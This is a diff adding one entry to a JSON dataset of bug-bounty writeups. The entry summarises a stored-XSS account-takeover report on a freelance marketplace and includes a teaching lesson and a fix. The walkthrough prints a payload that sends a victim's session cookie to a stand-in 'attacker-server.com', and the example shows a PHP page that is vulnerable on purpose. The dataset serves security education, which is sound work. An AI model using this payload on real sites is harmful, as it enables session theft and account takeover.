@@ -1,5 +1,45 @@
 [
   {
+    "id": "b1c0e1763ef1",
+    "title": "Stored XSS lead to full account take over",
+    "url": "https://medium.com/@mo.muwafak2001/stored-xss-lead-to-full-account-take-over-d530e7f6b26a",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "MUWAFAK HELAL"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-03T15:34:59.000Z",
+    "added_at": "2026-10-03T18:24:28.795Z",
+    "categories": [
+      "xss"
+    ],
+    "severity": "critical",
+    "difficulty": "beginner",
+    "summary_en": "A stored XSS vulnerability in a freelance marketplace's delivery submission field allowed attackers to steal session cookies and hijack accounts. The flaw existed because the final step of a multi-step workflow lacked input sanitization.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The root cause was a failure to sanitize user input in a specific, deep-level feature of the application. While developers protected visible, high-traffic fields, they neglected the 'delivery description' field used at the end of a transaction. They assumed that because the field was only accessible after a complex multi-step process—requiring both a service provider and a client to interact—it was safe from malicious use. This is a classic 'security through obscurity' mistake where developers trust the workflow rather than the data.",
+      "walkthrough": "RECON\n1. The researcher identified a freelance marketplace where users can buy and sell services.\n2. They noted that common fields (like profile names) were well-protected by Cloudflare and input filtering.\n\nDISCOVERY\n3. The researcher decided to simulate a full transaction between two accounts: an Attacker (freelancer) and a Victim (client).\n4. They navigated to the final stage of the workflow: the service delivery submission page.\n5. They identified a vulnerable endpoint used to submit the final work details.\nURL: https://www.example.com/en/deals/DealNo/implementation\nWhy: This endpoint accepted a 'summary' or 'description' of the work performed, which would later be viewed by the client.\n\nEXPLOITATION\n6. Log in as the Attacker and create a new service listing.\n7. Log in as the Victim and purchase/request that service.\n8. Switch back to the Attacker account and proceed to the 'delivery' stage.\n9. In the delivery description field, the researcher entered a malicious payload.\nPayload: <img src=x onerror=\"new Image().src='https://attacker-server.com/token='+encodeURIComponent(document.cookie)\">\nWhy: This payload uses an <img> tag with an invalid source ('x'). When the browser fails to find the image, it triggers the 'onerror' event (a JavaScript trigger). The code inside 'onerror' creates a new image request to the attacker's server, appending the victim's 'document.cookie' (the secret data used to keep a user logged in) to the URL.\n10. The Attacker submits the delivery, saving the payload into the platform's database.\n\nIMPACT\n11. The Victim logs in and opens the delivery page to verify the work.\n12. The Victim's browser renders the page, encounters the broken <img> tag, and executes the JavaScript in 'onerror'.\n13. The browser automatically sends the Victim's session cookie to the Attacker's server.\n14. The Attacker retrieves the cookie from their server logs and uses it to impersonate the Victim, achieving full account takeover.",
+      "example": "Imagine a fictional site 'target.example' that allows users to send 'Gift Cards' with custom messages. The message field is only visible after the sender pays $1.00. The developer assumes no one will pay $1.00 to test for bugs.\n\nVulnerable Code (PHP):\n<?php\n$message = $_POST['gift_message'];\necho \"<h1>Your Gift Message:</h1> <p>$message</p>\";\n?>\n\nAttack Request:\nPOST /send-gift HTTP/1.1\nHost: target.example\nContent-Type: application/x-www-form-urlencoded\n\ngift_message=<script>alert(document.domain)</script>\n\nWhy it works: The application takes the 'gift_message' parameter (a piece of data sent by the user) and prints it directly into the HTML page without cleaning it. When the recipient opens the gift, the browser sees the <script> tag (a command to run code) and executes the alert, proving that any code could be run.",
+      "takeaway": "Always test the 'end' of a workflow, such as checkout pages, delivery confirmations, or 'thank you' screens. Developers often focus security efforts on the 'front door' (login/signup) and relax controls on internal pages that require effort to reach. Look for fields that are only visible to specific users (like admins or clients) after a transaction. A common variant is 'Blind XSS,' where the payload executes in an internal admin dashboard hours or days after it was submitted. Avoid the mistake of assuming that a paywall or a complex multi-step process acts as a security barrier.",
+      "fix": "To fix this, the application must implement strict output encoding. This means converting special characters like '<' and '>' into their HTML entity equivalents ('&lt;' and '&gt;') so the browser treats them as plain text instead of executable code. Additionally, the 'HttpOnly' flag should be set on all session cookies to prevent JavaScript from accessing them via 'document.cookie'.\n\nFixed Code (PHP):\n<?php\n$message = $_POST['gift_message'];\n// Use htmlspecialchars to neutralize HTML tags\necho \"<h1>Your Gift Message:</h1> <p>\" . htmlspecialchars($message, ENT_QUOTES, 'UTF-8') . \"</p>\";\n?>",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "Hello everyone, I believe sharing is caring, and i have been learning from multiple security researchers in the Infosec community. So Now, I am going to share with how I found SXSS. What is Stored XSS ? Stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. **Summary :** A Stored Cross-Site Scripting (XSS) vulnerability was discovered in a freelance marketplace platform that connects freelancers with clients. The vulnerability exists in the service",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
     "id": "51e0a975fe3c",
     "title": "I Spent 6 Hours on a Report That Got Closed in 4 Minutes. Here’s What I Learned.",
     "url": "https://medium.com/@riyalimba/i-spent-6-hours-on-a-report-that-got-closed-in-4-minutes-heres-what-i-learned-5c22ca04048d",
